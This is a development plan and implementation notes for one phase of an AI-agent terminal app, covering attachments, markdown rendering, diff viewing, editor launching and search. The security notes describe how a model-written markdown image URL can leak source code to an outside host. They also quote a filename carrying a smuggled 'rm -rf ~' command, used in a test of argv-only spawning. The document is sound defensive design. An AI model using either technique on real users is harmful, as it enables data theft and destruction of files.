# Phase 5 — Rich Content & Search

Read `plan/00-master-plan.md` first. This file is self-contained for execution.

## Goal

Fill out the remaining input/output richness the docs specify: real image/file attachment handling, full markdown/code rendering, code-block utilities, and real scrollback/conversation search (Phase 1 only stubbed the search overlay UI and local mock-text matching).

## Scope

**In scope:**
- **Image support:** real clipboard paste (replace Phase 1's placeholder attachment-chip stub with actual image bytes captured from the OS clipboard), drag-and-drop image files onto the window, multiple images per message, preview thumbnails in the attachment chip row, and automatic gating on the active agent's detected vision capability (don't offer image attach if the current agent/model doesn't support vision — use the capability-detection groundwork from Phase 2's adapter trait).
- **File support:** attach source code, markdown, PDF, JSON, YAML, log files via the attach button or single-file drag-and-drop; detect file type and show an appropriate icon/preview; if a dropped/attached file is huge or binary, truncate/warn rather than blindly sending it (per `docs/features.claude.md` §4's "Smart File Context Ingestion" truncated-preview idea, scoped to single files).
- **Drag & drop:** drop directly into the terminal pane (not just a dedicated drop zone) — auto-attach, auto-detect type, auto-preview, matching docs' §17. **Narrowed to single-file drops for v1** (per master plan scope adjustments) — dropping a whole directory with `.gitignore`-aware recursive ingestion is deferred past v1; a dropped folder can either be rejected with a clear message or (if trivial to add) just attach the top-level files, not walk the tree.
- **Rich markdown rendering:** real markdown renderer (tables, syntax-highlighted code fences for 100+ languages, lists, blockquotes, collapsible `<details>` sections) replacing Phase 1's simplified `resp`/`out` line rendering — pick a lightweight, embeddable renderer + a syntax highlighter that doesn't blow up bundle size/startup time (respect the perf goals from the master plan).
- **Code block utilities:** copy, save-to-file, diff view (extend Phase 1's existing `colorBlock` diff coloring into a real unified/side-by-side diff viewer), open-in-editor (shell out to `$EDITOR` or a configured editor command).
- **Clipboard:** multi-line paste preserving formatting, auto-strip shell prompt characters (`$`/`>`) when copying command blocks — per docs §5/§14.
- **Real scrollback search:** wire Phase 1's search overlay to actually search full session transcript history (not just the currently rendered mock lines), supporting regex and fuzzy modes (§13), with match count and next/prev navigation.
- **Conversation history search:** separate from in-session scrollback search — search across *all* saved sessions (queries the SQLite session-transcript store Phase 3 builds — `src-tauri/src/sessions/store.rs`), filenames, and previous prompts.

**Out of scope (explicitly deferred):**
- Settings UI for configuring ignore patterns or default editor — Phase 6 (hardcode sane defaults now, e.g. respect existing `.gitignore`, default `$EDITOR` env var).

## Security

- **Markdown/diff rendering is the highest-risk surface in the whole plan.** Any HTML the markdown library produces must pass through a strict sanitizer (DOMPurify or equivalent) before mounting — strip `<script>`, event-handler attributes, `javascript:` URLs. This applies to model output, file contents, and pasted text alike; do not special-case any source as "safe."
- **"Open in editor" must spawn via argv array** (`Command::new(editor).arg(path)`), never a shell-interpolated string — a crafted filename must not be able to inject shell syntax.
- File ingestion (attach/drag-drop) must validate the resolved path stays where expected — resolve symlinks and reject/flag anything escaping the workspace or dropped-file's own directory before reading contents.
- The Tauri commands added here (file read, clipboard image capture) are explicit allowlist entries per the master plan's cross-cutting rule, args validated in Rust.

## Key Files/Modules to Create/Modify

```
src-tauri/
  src/
    files/
      ingest.rs           # file-type detection, size/binary guard (single-file scope)
    clipboard/
      image.rs              # OS clipboard image capture
src/
  components/
    AttachmentPreview.tsx
    DropZone.tsx (or window-level drop handler)
    DiffViewer.tsx
    MarkdownRenderer.tsx    # wraps chosen md + syntax-highlight libs
  state/
    searchStore.ts            # real transcript + cross-session search
    fileIngestStore.ts
```

## Reference

- `docs/features.gpt.md` §13–§19 (Search, Clipboard, Image, File, Drag & Drop, Rich Markdown, Code Block Utilities).
- `docs/features.claude.md` / `docs/features.gemini..md` §4 ("Smart File Context Ingestion," truncated preview before send), §5 (Rich Media & Image Pasting, Clipboard & Native Selection, In-Session Incremental Search, Diff viewer).
- Phase 1's `SearchOverlay.tsx` and attachment-chip UI — extend, don't rewrite.

## Acceptance Criteria

1. Pasting a real screenshot into the input attaches actual image bytes, shown as a thumbnail, and is included in the next prompt sent to a vision-capable model.
2. Dropping a single file onto the terminal pane attaches it with correct type detection; a huge or binary file is truncated/warned rather than sent whole; dropping a folder behaves predictably (clear rejection or top-level-only attach — not silent full-tree ingestion).
3. A response containing a markdown table, a fenced code block, and a collapsible section all render correctly (not as raw text).
4. Diff-formatted responses render with a real diff viewer, and "open in editor" successfully opens the relevant file in the user's configured editor.
5. `Ctrl+F`/`⌘F` search finds matches across the entire session transcript (including lines scrolled out of view), not just what's currently mounted in the DOM.

---

## Implementation notes

### Rendering: one HTML surface, one sanitizer

`state/markdown.ts` is the only module that produces HTML and `Markdown.tsx` the
only component that mounts it. Everything else in the transcript is React
children. The sanitizer runs on markdown output, on highlight.js output, and
again on anything re-inserted while highlighting fences — including markup Kora
generated itself, because "we wrote it" is not a security property.

**`<img>` is not in the allowlist**, which the plan did not anticipate. Markdown
image syntax renders as its alt text instead. An image tag is a network request
the *model* chose and a URL is a channel: `![](https://elsewhere/?d=…)` fires on
paint with nothing to click, which makes it an exfiltration primitive in a tool
whose whole context is the user's source code. Attachments the user added are
rendered from their own bytes, which needs no tag.

Links get `target="_blank"` + `rel="noopener noreferrer nofollow"`; `style`,
`script`, `iframe`, `form`, event handlers, and `javascript:`/`data:` URLs are
all refused.

Streaming responses render as plain text and only become markdown when the turn
settles — a half-written fence or table would otherwise flicker through every
intermediate parse.

Bundle: highlight.js is imported as core plus 25 registered languages rather
than the full pack. An unknown fence label renders escaped plain text rather
than auto-detecting, because detection on a short snippet is usually wrong and
wrong colours read as a claim about the code. Production bundle is 423 KB raw /
136 KB gzipped.

### Ingestion: one policy, in Rust

`files/ingest.rs` owns the whole file policy — 64 KB of text (truncated past
that, with the real size still reported), 3.5 MB for images, binary detected by
NUL bytes or invalid UTF-8 and attached by path rather than as mangled text,
folders refused with something the user can act on.

Bytes that never touched disk (a pasted screenshot, the webview's file picker)
go through `ingest_bytes`, which shares that policy, so **how a file entered
Kora cannot change what Kora does with it**. Paths are canonicalized before
anything is read, so a `..` segment never survives into the record.

Drag-and-drop uses the webview's own drop event and reads the bytes, rather than
Tauri's path-carrying drag-drop event: it works identically in tests and in a
browser preview, and it keeps a single ingest path. A dropped folder is
rejected explicitly (v1 scope).

### Attachments reach the agent as protocol, not prose

`AgentAdapter::encode_prompt_with` puts images in the API's own base64 image
block and text files in a text block that names the path, so the agent can read
the rest itself instead of Kora shipping a repository through the prompt.
Images are refused up front for an agent whose adapter does not declare
`Capability::Vision`, rather than spending a turn discovering it.

### Editor and save

`files/open.rs` spawns argv arrays only. `$VISUAL` beats `$EDITOR`; flags in
either (`code -w`) are preserved as separate arguments; macOS falls back to
`open`. A file named `; rm -rf ~ && echo pwned.txt` is one argument, and there
is a test that proves the file survives.

The save target is asked for with a prompt in the webview and written by the
backend, since this build adds no dialog plugin.

### Search

In-session search runs over `session.lines` — the store's whole transcript,
including code blocks — so a match twenty screens up is found and can be
stepped to; `activeMatchKey` scrolls it into view. Three modes: plain, regex
(an unfinished pattern matches nothing rather than throwing), and fuzzy
(characters in order, one hit per line).

Cross-session search is the one part that must ask the backend, since most of
what it searches is not open in a tab: `sessions_search` does a case-insensitive
`LIKE` over stored line payloads with `%` and `_` escaped, so a query containing
them finds those characters instead of acting as a wildcard.

### Multi-line input

The command input is now a growing `textarea`: Enter sends, Shift+Enter is a
newline, and a pasted block keeps its newlines and indentation. History arrows
only take the key while the input is a single line, so multi-line editing keeps
normal caret movement.

### Not done

- **Directory ingestion** — out of scope for v1 per the master plan; dropping a
  folder is refused with a message rather than silently walking the tree.
- **Fuzzy match spans** — fuzzy mode reports one match per line rather than
  highlighting each matched character, which would light up most of a line.
